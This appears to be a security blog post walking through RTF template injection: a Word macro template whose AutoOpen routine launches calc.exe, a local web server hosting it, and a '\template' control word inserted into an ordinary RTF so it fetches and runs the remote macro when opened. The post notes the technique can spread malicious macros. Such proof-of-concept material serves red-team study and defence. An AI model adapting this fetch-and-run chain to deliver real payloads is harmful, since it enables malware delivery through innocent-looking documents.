---
layout: post
title: 'RTF Template Injection'
date: '2022-02-09'
description: 'In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.'
coverimage: RTF_Template_Injection.jpg
tags: exploit-development rtf
published: true
posttype: article
categories: article
---

In this example, we will demonstrate how to use the “template” control word to cause an RTF file to pop up the calculator app when opened.  “Hold on... I can use the Start menu to do that. Why should I care?”, you may wonder. The simple answer is that this technique can be easily modified to spread malicious macros using otherwise benign looking RTF files.

## What is an RTF file?

Tapping away in front of your Macintosh or the early versions of Windows, did you ever wonder what those .rtf files (Rich Text Format) were that you ever so occasionally encountered? The ones that were opened up with text editors (featuring a horizontal ruler) other than your trusted notepad?

RTF traces back to the late 1980s when it was developed and released. Rich text format files, as opposed to plain text files, can contain images, different font styles, formatting, and more. They are interoperable, which means they can be processed by a wide range of technologies, making them a portable file type. 

## Why should I care?

"Why should I care?" you might wonder. The short answer is that with little modification, this technique can be leveraged to spread malicious macros in otherwise benign RTF files - as actively being done by threat actor groups online. Within RTF files, specific control words (see http://latex2rtf.sourceforge.net/rtfspec_62.html for more) are used. These control words are specially formatted commands that instruct applications how to handle the file. Let us get started!  

# Instructions - RTF template injection with a calculator pop-up

In this example, we will demonstrate how to use the "template" control word to cause an RTF file to fetch another file from a web server controlled by us.  This example makes use of the template editing capabilities of RTF files, as well as the ability to fetch resources from a specified URL. The code we will use opens up a calculator on a Windows-based operating system when the RTF file is run. Note that macros will require enabling on your system.

<h5 class="step">Step 1 - Create a macro-enabled Word template file</h5>

This file will contain our macro that executes the calculator app when the RTF file is opened. 

Open Word and add the following Visual Basic code (macro) to it. Save the file as `calc.dotm`. 

```
Sub AutoOpen()
Dim Program As String
Dim TaskID As Double
Program = "calc.exe"
TaskID = Shell(Program, 1)
End Sub
```

*If you are unfamiliar with creating Word template files, we recommend checking out Microsoft's documentation on them: https://support.microsoft.com/en-us/office/save-a-word-document-as-a-template-cb17846d-ecec-49d4-82ea-a6f5e3e8b9ae.*

<h5 class="step">Step 2 - Start a web server</h5>

Launch an HTTP server in the folder containing the 'calc.dotm' file using your preferred method. If you are using Python 3, you can use the following command with the port number of your choice. 

```
python3 -m http.server <port number>
```

<h5 class="step">Step 3 - Create a benign RTF file</h5>

Get or make a simple RTF file. We will modify this in the next step to fetch our macro-enabled template file from the web server launched.

![](5e05c49b-2704-464a-9eb8-6afe16b298ec.png)

*There are sample RTF files you can use available online. Please always have your anti-virus solution enabled when downloading files from the Internet.*

<h5 class="step">Step 4 - Add remote template fetching capabilities to the RTF file</h5>

Use a HEX editor to open the RTF file created in the previous step. I used Hex Editor Neo. 

Look for a pre-existing enclosing group for a font family control word (for example, Times New Roman if your file uses it). Insert the following text after the font's ending tag with your listening IP and port + payload/file to fetch. 

```
{\*\template http://<your-IP>:<port number>/calc.dotm}
```

![](514cab5a-57fa-4783-9db1-35ca3867a8ef.png)

<h5 class="step">Step 5 - Show time</h5>

Save the changes and open the RTF file in its default application. If you are a Windows user, this will likely be Word. The remote file will be loaded from your web server and used to launch the calculator program when the RTF file is opened.

The below screen capture displays the macro-enabled template file being fetched.

![](20e0eb7d-9a66-4ff2-991c-366e9a7a3d84.png)

The below screen capture displays the RTF file opened and the calculator app launched.

![](c6ec75ba-dad0-4755-903a-7de8f5065320.png)

### Well that was easy... Where to from here?

I hope this article has served as a foundation for your further explorations. Why not look into creating your custom macro-enabled template files next?